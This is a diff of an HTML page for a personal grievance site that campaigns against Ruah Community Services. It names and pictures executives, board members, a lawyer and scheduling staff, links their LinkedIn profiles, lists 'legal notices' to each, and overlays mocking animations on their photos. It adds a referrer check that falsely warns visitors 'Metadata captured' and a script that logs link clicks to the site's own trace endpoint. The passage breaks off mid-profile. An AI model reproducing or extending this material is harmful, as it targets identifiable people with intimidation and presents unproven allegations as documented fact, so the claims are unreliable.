@@ -1,84 +1,2910 @@
-<!-- trap.html — Randomized trap page variants -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title id="binaryTitle"></title>
+
+<!-- HOMEPAGE ONLY -->
+
+<script>
+  const allowed = "https://sharingsilence.xyz";
+  const ref = document.referrer;
+
+  if (!ref || !ref.startsWith(allowed)) {
+    document.body.innerHTML = `
+      <div style="background:#000;color:#7FCF7F;font-family:monospace;text-align:center;padding:2rem;">
+        <h2>🧠 Unauthorized Access</h2>
+        <p>Referrer check failed. Metadata captured.</p>
+        <p style="color:#f55;">Redirecting...</p>
+      </div>
+    `;
+    setTimeout(() => {
+      window.location.href = "https://sharingsilence.xyz/trap";
+    }, 5000);
+  }
+</script>
+
+
+
+<!-- END -->
+
+
+<!-- MAIN BODY -->
+
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<meta name="twitter:title" content="#SharingSilence — A Memoir">
+<meta name="twitter:description" content="An older autistic person. Abandoned 8 years. The record is public.">
+<meta name="twitter:image" content="https://i.imgur.com/w3vi2YM.png">
+<meta property="og:title" content="#SharingSilence — A Memoir" />
+<meta property="og:description" content="An older autistic person. Abandoned 8 years. The record is public." />
+<meta property="og:image" content="https://i.imgur.com/w3vi2YM.png" />
+<meta property="og:url" content="https://sharingsilence.xyz" />
+<meta property="og:type" content="website" />
+  <title>#RuahRuinsLives — A Memoir</title>
   <style>
     body {
-      margin: 0;
-      background: #000;
-      color: #7FCF7F;
-      font-family: monospace;
-      overflow: hidden;
-    }
-
-    .glitch {
-      font-size: 2.2rem;
-      position: absolute;
-      top: 40%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      color: #39FF14;
-      text-shadow: 1px 0 red, -1px 0 cyan;
-      animation: flicker 0.15s infinite alternate;
-    }
-
-    @keyframes flicker {
-      0% { opacity: 0.8; text-shadow: 1px 0 red, -1px 0 cyan; }
-      100% { opacity: 1; text-shadow: -1px 0 red, 1px 0 cyan; }
-    }
-
-    .ghost-bg {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: url('https://i.imgur.com/m8TMrhq.png') center center no-repeat;
+      background: #000000 url('https://i.imgur.com/BBFLozc.png') no-repeat center center fixed;
       background-size: cover;
-      opacity: 0.03;
-      z-index: 0;
-      pointer-events: none;
-      mix-blend-mode: lighten;
+      color: #A0B8A0;
+      font-family: 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+      line-height: 1.7;
+      padding: 20px;
+      margin: 0;
+    }
+    h1, h2 {
+      font-weight: 500;
+      color: #B7D1B0;
+      margin-top: 1em;
+      margin-bottom: 0.5em;
+      line-height: 1.3;
+    }
+    h1 {
+      font-size: 1.8em;
+      letter-spacing: 0.5px;
+    }
+    h2 {
+      font-size: 1.4em;
+    }
+    p {
+      font-size: 1.05em;
+      color: #B0C9AF;
+      margin-bottom: 1.2em;
+    }
+    strong {
+      color: #CDE9C1;
+    }
+    u {
+      text-decoration-color: #557755;
+      text-underline-offset: 3px;
+    }
+    hr {
+      border: 0;
+      height: 1px;
+      background-color: #334833;
+      margin: 2em 0;
+    }
+    .center {
+      text-align: center;
+    }
+    .footer-icons {
+      margin-top: 30px;
+      text-align: center;
+    }
+    iframe { display: block; margin: 30px auto; }
+
+    /* Fix link hover color for all required links */
+    a {
+      color: #88c0d0;
+      text-decoration: none;
+      transition: color 0.3s ease;
+    }
+    a:hover, a:focus {
+      color: #4da6ff;
+      text-decoration: underline;
+    }
+
+    /* Specific link styling overrides for PDF download and directors links */
+    .pdf-download, .board-link {
+      color: #88c0d0;
+      text-decoration: none;
+      transition: color 0.3s ease;
+    }
+    .pdf-download:hover, .pdf-download:focus,
+    .board-link:hover, .board-link:focus {
+      color: #4da6ff;
+      text-decoration: underline;
+    }
+
+    /* Shannon Mony section text size adjusted to match site */
+    #shannon-mony h2 {
+      font-size: 1.4em !important;
+      color: #c3f0c8;
+      margin-bottom: 0.5rem;
+      position: relative;
+    }
+    #shannon-mony div, 
+    #shannon-mony p,
+    #shannon-mony ul,
+    #shannon-mony li {
+      font-family: 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+      font-size: 1.05em !important;
+      line-height: 1.7 !important;
+      color: #c3f0c8 !important;
     }
   </style>
 </head>
 <body>
 
-  <div id="ghostContainer"></div>
-  <div class="glitch">⚠️ SYSTEM INSTABILITY DETECTED ⚠️</div>
-  <audio id="hum" loop preload="auto">
-    <source src="https://dl.dropboxusercontent.com/scl/fi/pl56m9ts9yd6c5yxc29by/low-engine-hum-72529.mp3?rlkey=cjykcdsekkv8biy8ijtyaiqnl&st=fxhyjuje" type="audio/mpeg">
-  </audio>
+
+
+<!-- END -->
+
+
+
+<!-- Title Section -->
+
+
+
+<div class="center">
+  <h1>SHARING SILENCE — HOW RUAH DESTROYS LIVES</h1>
+  <h2>A Memoir</h2>
+  <h1>#RuahRuinsLives</h1>
+</div>
+
+
+
+<!-- END -->
+
+
+
+<!-- utubz -->
+
+
+
+<style>
+  .video-container {
+    max-width: 420px;
+    margin: 1rem auto;
+    position: relative;
+    width: 30vw;
+    height: 20vw;
+  }
+
+  @media (min-width: 768px) {
+    .video-container {
+      width: 420px;
+      height: 320px;
+    }
+  }
+
+  .video-container iframe {
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%;
+    height: 100%;
+    border: none;
+    border-radius: 8px;
+  }
+</style>
+
+<div class="video-container">
+  <iframe 
+    src="https://www.youtube.com/embed/l2Ou825hyzU?si=iOyiI0T01EvoAfB6" 
+    title="CORP_S00E00"
+    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
+    referrerpolicy="strict-origin-when-cross-origin"
+    allowfullscreen>
+  </iframe>
+</div><br>
+    
+  
+  
+<!-- END --> 
+
+
+
+<!-- Banner Update Section -->
+
+
+
+<!-- alert 1 -->
+
+<hr><div style="padding: 1rem; color: #ddd; border-bottom: 1px solid #333; font-family: sans-serif; font-size: 0.70rem; line-height: 1.5;"><p>
+    <strong>🟥 ALERT:</strong> As of 17 June 2025, a <strong>state-wide red flag</strong> has been issued across mental health services regarding Ruah Community Services.<br>
+    Ruah is not to be contacted, consulted, or involved in any matter relating to the author or their case. This red flag is not just personal — Ruah is now formally flagged as a systemic risk within the mental health sector.
+  </p></Div>
+
+<!-- alert 2 -->
+
+<div style="padding: 1rem; color: #ddd; border-bottom: 1px solid #333; font-family: sans-serif; font-size: 0.70rem; line-height: 1.5;">
+  <p><strong>📛 Access Revoked – Red Flags Issued:</strong> as of 20th June 2025 Red flags have now been placed at <strong>Housing Choices</strong> and <strong>Medical Centres</strong>. All third-party access to records, referrals, or updates has been terminated. <em>Freedom of Information requests</em> have been submitted and are now active across these entities. A full record of all backchannel contact will be retrieved and logged. This revocation comes 3 days after Alma Street <strong>state wide</strong> red flag was issued. It applies to <strong>all domains and contexts</strong> in which Ruah previously operated.<br>
+  </p>
+</div><br>
+
+
+
+<!-- END -->
+
+
+
+<!-- Updates -->
+
+
+
+<style>
+  .stable-img {
+    width: 300px;
+    max-width: 100%;
+    min-width: 200px;
+    height: auto;
+    border-radius: 10px;
+    box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    float: left;
+    margin-right: 1rem;
+    margin-bottom: 0.5rem;
+  }
+
+  @media (max-width: 600px) {
+    .stable-img {
+      float: left;
+      display: inline;
+      margin: 0 1rem 1rem 0;
+    }
+  }
+
+  .caption-block {
+    clear: both;
+    font-size: 0.8rem;
+    color: #ccc;
+  }
+</style>
+  
+<!-- Ambass -->
+
+<strong><h3>Dr Chong</h3></strong>
+<div class="caption-block"><p style="font-size: 0.8rem; color: #c3f0c8; font-family: sans-serif;">
+  <p>Ambassador for Ruah.<br>
+Chose to block and hide.<br></p>
+</div>
+  
+<!-- LOL carrd -->
+
+<strong><h3>CARRD PATH WALKING</h3></strong>
+<img src="https://i.imgur.com/qi88NH5.jpeg" alt="Google Analytics" class="stable-img" />
+<div class="caption-block"><p style="font-size: 0.8rem; color: #c3f0c8; font-family: sans-serif;">
+  <p>'sharingsilence.carrd.co'<br></p>
+</div>
+
+<!--Mental Health -->
+
+<strong><h3>MENTAL HEALTH MONTH</h3></strong>
+<img src="https://i.imgur.com/AfeqkWt.jpeg" alt="Google Analytics" class="stable-img" />
+<div class="caption-block"><p style="font-size: 0.8rem; color: #c3f0c8; font-family: sans-serif;">
+  <p>The month of my Mum's death.<br>
+  <strong>(her name was also June)</strong>
+</p>
+</div>
+
+<!-- traffiic -->
+
+<strong><h3>OVERNIGHT TRAFFIC</h3></strong>
+<img src="https://i.imgur.com/XNDVJgO.jpeg" alt="Google Analytics" class="stable-img" />
+<div class="caption-block"><p style="font-size: 0.8rem; color: #c3f0c8; font-family: sans-serif;">
+  <p>Google Analytics.<br>
+</p>
+</div>
+
+<!-- New Dowloads -->
+
+<strong><h3>DOWNLOADS</h3></strong>
+<img src="https://i.imgur.com/nLGevg3.jpeg" alt="Reddit Ruah" class="stable-img" />
+<div class="caption-block"><p style="font-size: 0.8rem; color: #c3f0c8; font-family: sans-serif;">
+  <p>Late Saturday Night 🤦‍♂️.<br></p>
+</div>
+
+<!-- IT on Linkedin -->
+
+<strong><h3>Hello there, Ruah IT.</h3></strong>
+<img src="https://i.imgur.com/NB1wDrf.jpeg" alt="Ruah IT Sneak" class="stable-img" />
+<div class="caption-block">
+  <p>
+Nothing Malicious here.</p>
+</div>
+
+<!-- Site light up -->
+
+<strong><h3>LEGAL LETTERS HIT</h3></strong>
+<img src="https://i.imgur.com/btJWQDL.jpeg" alt="domain lights up ruah" class="stable-img" />
+<div class="caption-block">
+  <p>Downloads?<br></p>
+</div>
+
+<!-- childish -->
+
+<strong><h3>FAKE ACCOUNT</h3></strong>
+<img src="https://i.imgur.com/HSqAj7R.jpeg" alt="Fake LinkedIn account used to view profile" class="stable-img" />
+<div class="caption-block">
+  <p>Only Ruah know my full name.<br>
+  This is to protect my children, not me..<br></p>
+</div>
+
+<!-- porkbun -->
+
+<strong><h3>TRIED TO ACCESS MY ACCOUNT</h3></strong>
+<img src="https://i.imgur.com/fQ1HrtT.png" alt="Failed Porkbun login attempt" class="stable-img" />
+<div class="caption-block">
+  <p>Access Denied! Nice Try.<br></p>
+</div><hr>
+
+
+
+<!-- END -->
+
+
+
+<!-- Play section -->
+
+
+
+<!-- ASN PIC -->
+  
+<strong><h3>🪞Microsoft Says Hi!</h3></strong>
+<div class="heart-image-wrapper" style="width: 300px;" onmouseover="spawnMultipleHearts(this)">
+  <img src="https://i.imgur.com/OrlLp32.png" alt="Privacy act triggered Ruah" />
+</div>
+<div class="caption-block">
+  <p>
+     Repeatedly. Silently. Awkwardly.<br>
+     ✨Digital creepers peeking through the blinds✨<br></p>
+</div>
+
+
+<!-- END -->
+
+
+                   
+<!-- LEAKS SECTION -->
+
+
+
+<!-- BOARD LEAKS -->
+
+<div style="padding: 1rem 0; font-size: 0.7rem; line-height: 1.4; font-family: sans-serif;"><p><h2><strong>📡 The board blocked and ran</strong></h2><br>
+  The CEO and CFO followed (now GM) — hiding, shielding, avoiding public connection to the truth.<br><br>
+
+  But here’s what they forgot:<br>
+  Their own website displays every name and face.<br>
+  Even if they delete or edit now — it’s too late.<br><br>
+
+  All pages have been archived:<br>
+  - Wayback Machine<br>
+  - Internet Archive<br>
+  - Google Cache<br><br>
+
+  Their silence is documented. Their faces are preserved. The truth cannot be erased.<br>
+
+  <a href="https://ruah.org.au/about-ruah/meet-the-team/board-of-directors/" class="board-link" target="_blank">📁 Directors</a><br>
+  <a href="https://ruah.org.au/about-ruah/meet-the-team/executive-team/" class="board-link" target="_blank">📁 Executive Team</a><br>
+  <a href="https://ruah.org.au/about-ruah/meet-the-team/ambassadors/" class="board-link" target="_blank">📁 Ambassadors</a>
+  </p>
+</div>
+
+<!-- SETTLEMENT LEAKS -->
+
+<div style="padding: 1rem 0; font-size: 0.7rem; line-height: 1.4; font-family: sans-serif;">
+  <p><h2><strong>📡 Original Settlement Offer Terms</strong></h2><br>
+
+  I was fair. I was reasonable.<br>
+  I offered them the chance to control the public narrative.<br>
+  I asked for a private resolution — on one symbolic date:<br>
+  <em>The anniversary of my mum’s death. Her name was June. The date was June 6.</em><br><br>
+
+  That wasn’t just a number on a calendar. That was a chance to heal — to close a wound she left me, through action instead of legacy.<br><br>
+
+  But here’s what they forgot:<br>
+  – I still have the original offer.<br>
+  – So do some of their frontline staff.<br>
+  – And Debra replied on <strong>the exact anniversary</strong> — with a cold, evasive delay.<br><br>
+Their silence was not just inaction. It was timed.<br>
+  The one date that mattered to me — they chose to ignore it.<br>
+  And now, the offer they buried… will speak louder than they ever did.<br><br>
+
+<!-- PDF Leak 1 -->
+
+<div style="font-family: sans-serif; font-size: 0.7rem; line-height: 1.4; padding: 1rem 0;">
+  <strong>PDF Releases:🔒</strong><br>
+🔗🔒<a href="http://sharingsilence.xyz/Ruah.html" class="pdf-download">
+  Formal legal notification to Ruah 29th May 2025
+</a><br>
+
+🔗🔒<a href="http://sharingsilence.xyz/Settlement.html" class="pdf-download">
+  My original settlement offer sent 3rd June 2025
+</a><br>
+
+🔗🔒<a href="http://sharingsilence.xyz/Shannon.html" class="pdf-download">
+  Legal notice to Shannon Mony 21st June 2025
+</a><br>
+
+🔗🔒<a href="http://sharingsilence.xyz/Meridian.html" class="pdf-download">
+  Legal notice to Meridian Lawyers 21st June 2025
+</a><br>
+
+🔗🔒<a href="http://sharingsilence.xyz/ShannonALMA.html" class="pdf-download">
+  Shannon's – When Mental Health Services Are Broken
+</a><br>
+
+🔗🔒<a href="http://sharingsilence.xyz/ShannonHBA.html" class="pdf-download">
+  Shannon's – HBA Legal – Health Law Newsletter (May 2016)
+</a><br>
+
+<!-- PDF Leak 2 -->
+
+<div style="font-family: sans-serif; font-size: 0.7rem; line-height: 1.4; padding: 1rem 0;">
+  <strong>PDF Releases 21st June 2025:🔒</strong><br>
+🔗🔒<a href="http://sharingsilence.xyz/Braden.html" class="pdf-download">
+  Braden Hill Legal Notice 21st June 2025
+</a><br>
+
+🔗🔒<a href="http://sharingsilence.xyz/Carmen.html" class="pdf-download">
+  Carmen Acosta Legal Notice 21st June 2025
+</a><br>
+
+🔗🔒<a href="http://sharingsilence.xyz/Debra.html" class="pdf-download">
+  Debra Zanella Legal Notice 21st June 2025
+</a><br>
+
+🔗🔒<a href="http://sharingsilence.xyz/Sandy.html" class="pdf-download">
+  Dr Sandy Chong Legal Notice 21st June 2025
+</a><br>
+
+🔗🔒<a href="http://sharingsilence.xyz/Duc.html" class="pdf-download">
+  Duc Fam Legal Notice 21st June 2025
+</a><br>
+
+🔗🔒<a href="http://sharingsilence.xyz/Elsie.html" class="pdf-download">
+  Elsie Blay Legal Notice 21st June 2025
+</a><br>
+
+🔗🔒<a href="http://sharingsilence.xyz/Gail.html" class="pdf-download">
+  Gail Beck Legal Notice 21st June 2025
+</a><br>
+
+🔗🔒<a href="http://sharingsilence.xyz/Graham.html" class="pdf-download">
+  Graham Donnelly Legal Notice 21st June 2025
+</a><br>
+
+🔗🔒<a href="http://sharingsilence.xyz/Jessica.html" class="pdf-download">
+  Jessica (Scheduling) Legal Notice 21st June 2025
+</a><br>
+
+🔗🔒<a href="http://sharingsilence.xyz/Jodie.html" class="pdf-download">
+  Jodie Harding Legal Notice 21st June 2025
+</a><br>
+
+🔗🔒<a href="http://sharingsilence.xyz/Justine.html" class="pdf-download">
+  Justine Roberts Legal Notice 21st June 2025
+</a><br>
+
+🔗🔒<a href="http://sharingsilence.xyz/Mark.html" class="pdf-download">
+  Mark Slattery Legal Notice 21st June 2025
+</a><br>
+
+🔗🔒<a href="http://sharingsilence.xyz/Louise.html" class="pdf-download">
+  Louise Ardagh Legal Notice 21st June 2025
+</a><br>
+
+🔗🔒<a href="http://sharingsilence.xyz/Michael.html" class="pdf-download">
+  Michael Shannon Legal Notice 21st June 2025
+</a><br>
+
+🔗🔒<a href="http://sharingsilence.xyz/Monica.html" class="pdf-download">
+  Monica Juricev Legal Notice 21st June 2025
+</a><br>
+
+🔗🔒<a href="http://sharingsilence.xyz/Nina.html" class="pdf-download">
+  Nina Anderson Legal Notice 21st June 2025
+</a><br>
+
+🔗🔒<a href="http://sharingsilence.xyz/Rabia.html" class="pdf-download">
+  Rabia Siddique Legal Notice 21st June 2025
+</a><br>
+
+🔗🔒<a href="http://sharingsilence.xyz/Rachael.html" class="pdf-download">
+  Rachael (Scheduling) Legal Notice 21st June 2025
+</a><br>
+
+🔗🔒<a href="http://sharingsilence.xyz/Shelia.html" class="pdf-download">
+  Shelia Jay Legal Notice 21st June 2025
+</a><br>
+
+🔗🔒<a href="http://sharingsilence.xyz/Sylvia.html" class="pdf-download">
+  Sylvia Meier Legal Notice 21st June 2025
+</a><br>
+
+🔗🔒<a href="http://sharingsilence.xyz/TonyCurry.html" class="pdf-download">
+  Tony Curry Legal Notice 21st June 2025
+</a><br><br>
+
+Legal notices sent via legal advocate Shannon Mony, CC'd known Ruah addresses.<br>
+If you did not recieve, speak to Shannon Mony or Debra Zanella.<br>
+Send responces to Ms Mony, send as one.<br><hr>
+
+
+
+<!-- END -->
+
+    
+    
+<!-- RUAH SECTION -->
+ 
+
+
+<!-- RUAH FACES -->
+
+<h1><center><a href="https://ruah.org.au/about-ruah/meet-the-team/" target="_blank" style="color: #88c0d0;" onmouseover="this.style.color='#4da6ff'" onmouseout="this.style.color='#88c0d0'">
+    <span style="text-decoration: font-weight: bold;">RUAH FACES — RUAH</span>
+  </a><br><br></center></h1>
+
+ 
+<!-- Elsie -->
+
+<h2>
+  <a href="https://www.linkedin.com/in/elsie-blay-ems/" target="_blank" style="color: #88c0d0;" onmouseover="this.style.color='#4da6ff'" onmouseout="this.style.color='#88c0d0'">
+    <span style="text-decoration: font-weight: bold;">Elsie Blay — LinkedIn</span>
+  </a><br>
+</h2>
+
+<!-- Image and quote side-by-side -->
+
+<!-- Block with Monster Animation -->
+
+<div style="overflow: visible; margin: 1.2rem 0; position: relative; min-height: 100px;">
+  <div style="position: relative; display: inline-block; float: left; width: 15%; margin-right: 1.2rem; margin-bottom: 0.5rem;" onmouseover="spawnMultipleMonsters(this)">
+    <img src="https://i.imgur.com/NEum1h3.png" alt="Elsie Blay Ruah" style="width: 100%; height: auto; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.2); display: block;">
+  </div>
+<p><strong>"over 15 years experience</strong> in the <strong>health and community</strong> sector." "<strong>committed</strong> to making sure <strong>systems work</strong> around the <strong>most vulnerable</strong> and <strong>disadvantaged</strong> people in our community."</p>
+    <p>– Elsie Blay</p>
+  </blockquote>
+</div>
+
+
+<!-- Clear float and continue layout -->
+
+<div style="clear: both;"></div>
+
+<p>Alleged <strong>mother</strong>. Registered nurse. Public health expert.<br>
+Champion of <strong>homelessness</strong> services. <strong>Disability</strong> sector leader.<br>
+Executive Manager of Services, <strong>Ruah Community Services — since circa 2017</strong>.<br>
+<u><strong>Responsible for overseeing</strong></u> day-to-day operations across <strong>all <u>Ruah programs</u></strong>: <strong>mental health, family and domestic violence, homelessness, disability</strong>.</p>
+
+<p>In her own public words, <strong>a voice</strong> for women, <strong>children, the homeless, and the disabled</strong>.<br>
+A <strong>defender of those left behind</strong>.<br>
+A <strong>builder of safe spaces</strong> — where <strong>no one</strong> would be <strong>isolated</strong>, <strong>starving</strong>, or <strong>left in fear</strong>.</p>
+
+<p>That is the <strong>role she claimed</strong>. The <strong>mission she led</strong>. The <strong>system she managed</strong>.</p>
+
+<h1><u><strong>What follows is the truth of what happened under her watch.</strong></u></h1>
+
+<p>And why <strong>her silence</strong> — and <strong>her organisation’s failure</strong> — <strong>erased</strong> an <strong>autistic father</strong> from his <strong>children’s lives</strong>, left a man <strong>starving alone</strong> for <strong>years</strong>, and directly <strong>violated every value</strong> she publicly espoused.</p>
+
+<p>This is not an opinion.<br>
+It is documented fact.<br>
+It is a matter of public record.</p>
+
+<p style="font-size: 0.8em;">
+  <a href="https://www.youtube.com/@SharingSilence81" target="_blank" style="color: #88c0d0;" onmouseover="this.style.color='#4da6ff'" onmouseout="this.style.color='#88c0d0'">[MORE TO COME]</a>
+</p><hr>
+
+
+
+<!-- ELSIE END -->
+
+
+
+<!-- Deb -->
+
+
+
+<h2>
+  <a href="https://www.linkedin.com/in/debra-zanella-816a2211a/" target="_blank" style="color: #88c0d0;" onmouseover="this.style.color='#4da6ff'" onmouseout="this.style.color='#88c0d0'">
+    <span style="text-decoration: font-weight: bold;">Debra Zanella — LinkedIn</span>
+  </a>
+</h2>
+
+<!-- Image and quote side-by-side -->
+
+<!-- Block with Snake Animation -->
+
+<div style="overflow: visible; margin: 1.2rem 0; position: relative; min-height: 100px;">
+  <div style="position: relative; display: inline-block; float: left; width: 15%; margin-right: 1.2rem; margin-bottom: 0.5rem;" onmouseover="spawnMultipleSnakes(this)">
+    <img src="https://i.imgur.com/b4ZxbEN.png" alt="Debra Zanella Ruah" style="width: 100%; height: auto; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.2); display: block;">
+  </div>
+    <p><strong>"I am a strong advocate for the most vulnerable and disadvantaged people in our community"</strong></p>
+    <p>– Debra Zanella</p>
+  </blockquote>
+</div>
+
+<!-- Remaining content flows below -->
+
+<div style="clear: both;"></div>
+
+<p><h2><strong><u>LinkedIn CEO games: Blocks, Unblocks, Re-Blocks, Unblocks, adds Profile pic she never had for years.</strong></u></h2></p>
+
+<p><strong>Chief Executive Officer of Ruah Community Services.</strong><br>
+<strong>Chair of the Australian Alliance to End Homelessness.</strong><br>
+Co-Chair of Reconciliation WA.<br>
+<strong>Former President of the Western Australian Council of Social Services.</strong><br>
+<strong>Advisor to the Ministerial Housing First Homelessness Advisory Group.</strong><br>
+Board member of the State Training Board.<br>
+Leader of the 50 Lives 50 Homes campaign.<br>
+<strong>Voice for</strong> women, <strong>children, and survivors of violence.</strong><br>
+Builder of <strong>trauma-informed spaces.</strong><br>
+<strong>Strategist</strong> of <strong>systemic change</strong>.</p>
+
+<p><u><strong>Her public statements are clear:</strong></u> violence must be addressed at its roots. Homelessness must be ended, not managed. Systems must be accountable.</p>
+
+<p>She has spoken of the need for <strong>long-term healing</strong>, <strong>early intervention</strong>, and <strong>culturally safe care</strong>. She has called for urgent action to <strong>protect</strong> women and <strong>children</strong>.</p>
+
+<p>She has built a <strong>reputation</strong> on these principles.</p>
+
+<h1><u><strong>What follows is the documented reality of what occurred under her leadership.</strong></u></h1>
+
+<p>The silence.<br>
+The neglect.<br>
+The erasure.</p>
+
+<p>This is not conjecture.<br>
+It is evidence.<br>
+It is testimony.<br>
+<strong>It is the truth behind the image.</strong></p>
+
+<p style="font-size: 0.8em;">
+  <a href="https://x.com/AHuman88539392" target="_blank" style="color: #88c0d0;" onmouseover="this.style.color='#4da6ff'" onmouseout="this.style.color='#88c0d0'">[MORE TO COME]</a>
+</p><hr>
+
+<!-- DEBRA END -->
+
+
+
+<!-- Shannon -->
+
+
+
+<h2>
+  <a href="https://au.linkedin.com/in/shannon-mony-71bb4b88" target="_blank" style="color: #88c0d0;" onmouseover="this.style.color='#4da6ff'" onmouseout="this.style.color='#88c0d0'">
+    <span style="text-decoration: underline; font-weight: bold;">Shannon Mony — LinkedIn</span>
+  </a>
+</h2>
+
+
+<!-- Floating Heart Animation -->
+
+<style>
+  @keyframes floatHeart {
+    0% { transform: translateY(0) scale(1); opacity: 1; }
+    100% { transform: translateY(-50px) scale(1.5); opacity: 0; }
+  }
+</style>
+
+<!-- Block with Heart Animation -->
+
+<div style="overflow: visible; margin: 1.2rem 0; position: relative; min-height: 100px;">
+  <div style="position: relative; display: inline-block; float: left; width: 15%; margin-right: 1.2rem; margin-bottom: 0.5rem;" onmouseover="spawnMultipleHearts(this)">
+    <img src="https://i.imgur.com/NVAV5Cj.png" alt="Shannon Mony at Two Peoples Bay Nature Reserve" style="width: 100%; height: auto; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.2); display: block;">
+  </div>
+
+  <blockquote style="margin: 0; font-size: 0.8rem; color: #c3f0c8; font-style: italic;">
+    <p><b>“I volunteer because I am a firm believer in the importance of giving back. I am also motivated by being a good role model for my two daughters.”</b></p>
+    <p>– Shannon Mony, <a href="https://www.projectdidiaustralia.org/project-didi-updates/shannon-mony" target="_blank" class="shannon-link">Project Didi</a></p>
+  </blockquote>
+</div>
+
+<div style="clear: both;"></div>
+  <p style="font-size: 0.8rem; font-family: sans-serif; color: #c3f0c8;">
+    Shannon Mony is listed as a <strong><u>Communications & Engagement Officer</strong></u> for a <strong><u>humanitarian NGO</strong></u>, <strong><u>speaking publicly</strong></u> about her <strong><u>belief in justice, consent, and trauma-informed care</strong></u>. Yet in her professional capacity as a lawyer for <a href="https://www.linkedin.com/company/meridian-lawyers/posts/?feedView=all" target="_blank" style="color: #88c0d0;" onmouseover="this.style.color='#4da6ff'" onmouseout="this.style.color='#88c0d0'">Meridian — LinkedIn</a>, she has <strong><u>failed to respond</strong></u> to <strong><u>urgent, documented pleas</strong></u> for <strong><u>negotiation</strong></u> from an <strong><u>autistic man abandoned</strong></u> by Ruah.
+  </p></p>
+
+  <p style="font-size: 0.8rem; font-family: sans-serif; color: #c3f0c8;">
+    Shannon is also a <strong><u>registered speaker</strong></u> for upcoming <strong><u>CPD events</strong></u> including <strong><u>LawSense 2025</strong></u>, where she will present on:
+  </p></p>
+
+ <p style="font-size: 1.0rem; font-family: sans-serif; color: #c3f0c8;"><strong><h3>
+    <li>Consent and mature minors</li>
+    <li>Trauma-informed mental health documentation</li>
+    <li>Ethics of patient confidentiality and family law reporting</li>
+  </h3></strong></ul></p>
+
+  <p style="font-size: 0.8rem; color: #c3f0c8; font-family: sans-serif;">
+    This <strong><u>contradiction between public image</strong></u> and <strong><u>legal silence</strong></u> matters. The <strong><u><a href="https://www.linkedin.com/company/meridian-lawyers/posts/?feedView=all" target="_blank" style="color: #88c0d0;" onmouseover="this.style.color='#4da6ff'" onmouseout="this.style.color='#88c0d0'">Meridian Lawyers team — LinkedIn</a></strong></u> is <strong><u>actively defending</strong></u> an organisation <strong><u>accused</strong></u> of <strong><u>letting</strong></u> a <strong><u>disabled client starve</strong></u> and <strong><u>go unsupported</strong></u> for <strong><u>8 years</strong></u> — yet has <strong><u>refused to negotiate</strong></u>.</p>
+  
+ 
+<p style="font-size: 0.8rem; color: #c3f0c8; font-family: sans-serif;">
+<p><a href="https://www.linkedin.com/in/mark-birbeck-84058550/" target="_blank" style="color: #88c0d0;" onmouseover="this.style.color='#4da6ff'" onmouseout="this.style.color='#88c0d0'">Mark Birbeck — LinkedIn</a> also works for <a href="https://www.linkedin.com/company/meridian-lawyers/posts/?feedView=all" target="_blank" style="color: #88c0d0;" onmouseover="this.style.color='#4da6ff'" onmouseout="this.style.color='#88c0d0'">Meridian Lawyers — LinkedIn</a> and connected with me on LinkedIn, read my profile and recieved screeenshots, along with many Meridan partners.</p></p>
+
+
+  <p style="font-size: 0.8rem; color: #c3f0c8; font-family: sans-serif;">
+    📄 Related readings:<br>
+    <a href="https://www.hbalegal.com/wp-content/uploads/2016/05/When-Mental-Health-Services-Are-Broken.pdf" target="_blank" class="shannon-link">When Mental Health Services Are Broken (HBA Legal)</a><br>
+    <a href="https://www.hbalegal.com/wp-content/uploads/2016/06/HBA-Legal-May-2016-Health-Law-Newsletter.pdf" target="_blank" class="shannon-link">HBA Legal Health Law Newsletter – May 2016</a>
+  </p>
+
+  <p style="font-size: 0.8rem; color: #c3f0c8; font-family: sans-serif; margin-top: 2rem;">
+    🧠 Transparency is not an attack. It is a mirror. If you're uncomfortable seeing this, ask why it reflects poorly — and who chose silence.
+  </p>
 
   <script>
-    const binaryTitles = [
-      '01010010 01110101 01100001 01101000',  // Ruah
-      '01000111 01101000 01101111 01110011 01110100', // Ghost
-      '01000101 01100011 01101000 01101111', // Echo
-      '01010110 01101111 01101001 01100100', // Void
-      '01000100 01100001 01110100 01100001', // Data
-      '01010100 01110010 01100001 01110000'  // Trap
+    document.querySelectorAll('a.shannon-link').forEach(link => {
+      link.addEventListener('click', () => {
+        fetch('https://sharingsilence.xyz/trace?source=shannon');
+      });
+    });
+  </script>
+
+  <meta name="keywords" content="Shannon Mony, Meridian Lawyers, Ruah, disability neglect, trauma-informed care, Project Didi, legal accountability">
+
+<p style="font-size: 0.8rem; color: #c3f0c8; font-family: sans-serif; font-style: italic;">
+  <b>Silence at this point is not strategy — it is complicity. This legal firm is no longer a bystander.</b>
+</p>
+
+</section><hr>
+
+<!-- SHANNON END -->
+
+
+
+<!-- Grey -->
+
+
+
+<h2>
+  <a href="https://www.linkedin.com/in/grahamdonnelly17/" target="_blank" style="color: #88c0d0;" onmouseover="this.style.color='#4da6ff'" onmouseout="this.style.color='#88c0d0'">
+    <span style="text-decoration: underline; font-weight: bold;">Graham Donnelly — LinkedIn</span>
+  </a>
+</h2>
+
+<!-- Image and optional placeholder quote -->
+
+<div style="overflow: visible; margin: 1.2rem 0; position: relative; min-height: 100px;">
+  <div style="position: relative; display: inline-block; float: left; width: 15%; margin-right: 1.2rem; margin-bottom: 0.5rem;" onmouseover="spawnGreedyIcons(this)">
+    <img src="https://i.imgur.com/JiKj2Q5.png" alt="Graham Donnelly Ruah" style="width: 100%; height: auto; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.2); display: block;">
+  </div>
+  <blockquote style="margin: 0; font-size: 0.8rem; color: #c3f0c8; font-style: italic;">
